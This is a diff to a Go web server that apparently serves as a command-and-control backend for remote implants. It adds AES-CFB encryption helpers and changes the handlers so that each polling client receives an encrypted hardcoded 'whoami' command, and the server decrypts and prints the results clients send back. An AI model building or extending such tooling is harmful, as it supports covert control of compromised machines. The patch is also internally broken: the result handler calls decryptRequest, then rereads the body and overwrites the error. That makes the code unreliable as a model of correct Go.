@@ -6,6 +6,7 @@ import (
 	"crypto/rand"
 	"encoding/csv"
 	"encoding/json"
+	"encoding/base64"
 	"errors"
 	"fmt"
 	"html/template"
@@ -86,7 +87,42 @@ func main() {
 	log.Println("Server starting on :{lport}")
 	log.Fatal(http.ListenAndServe(":{lport}", nil))
 }
+// Encrypt cifra un texto plano usando AES-CFB.
+func Encrypt(plainText string, key []byte) (string, error) {
+    block, err := aes.NewCipher(key)
+    if err != nil {
+        return "", err
+    }
+    plaintext := []byte(plainText)
+    ciphertext := make([]byte, aes.BlockSize+len(plaintext))
+    iv := ciphertext[:aes.BlockSize]
+    if _, err := rand.Read(iv); err != nil {
+        return "", err
+    }
+    stream := cipher.NewCFBEncrypter(block, iv)
+    stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)
+    return base64.StdEncoding.EncodeToString(ciphertext), nil
+}
 
+// Decrypt descifra un texto cifrado usando AES-CFB.
+func Decrypt(cipherText string, key []byte) (string, error) {
+    ciphertext, err := base64.StdEncoding.DecodeString(cipherText)
+    if err != nil {
+        return "", err
+    }
+    block, err := aes.NewCipher(key)
+    if err != nil {
+        return "", err
+    }
+    if len(ciphertext) < aes.BlockSize {
+        return "", fmt.Errorf("ciphertext too short")
+    }
+    iv := ciphertext[:aes.BlockSize]
+    ciphertext = ciphertext[aes.BlockSize:]
+    stream := cipher.NewCFBDecrypter(block, iv)
+    stream.XORKeyStream(ciphertext, ciphertext)
+    return string(ciphertext), nil
+}
 func createDirectories() {
 	dirs := []string{
 		filepath.Join(allowedDirectory, "uploads"),
@@ -155,15 +191,30 @@ func commandHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 func handleGetCommand(w http.ResponseWriter, clientID string) {
-	if command, exists := popCommand(clientID); exists {
-		sendEncryptedResponse(w, command)
-	} else {
-		sendEmptyResponse(w)
-	}
+    command := "whoami" // Ejemplo de comando
+    key := []byte(os.Getenv("AES_KEY"))
+    encryptedCommand, err := Encrypt(command, key)
+    if err != nil {
+        http.Error(w, "Encryption failed", http.StatusInternalServerError)
+        return
+    }
+    w.Write([]byte(encryptedCommand))
 }
 
 func handlePostResult(w http.ResponseWriter, r *http.Request, clientID string) {
 	data, err := decryptRequest(r)
+	body, err := io.ReadAll(r.Body)
+    if err != nil {
+        http.Error(w, "Failed to read request body", http.StatusBadRequest)
+        return
+    }
+    key := []byte(os.Getenv("AES_KEY"))
+    decryptedResult, err := Decrypt(string(body), key)
+    if err != nil {
+        http.Error(w, "Decryption failed", http.StatusInternalServerError)
+        return
+    }
+    fmt.Println("Received result:", decryptedResult)
 	if err != nil {
 		http.Error(w, err.Error(), http.StatusBadRequest)
 		return
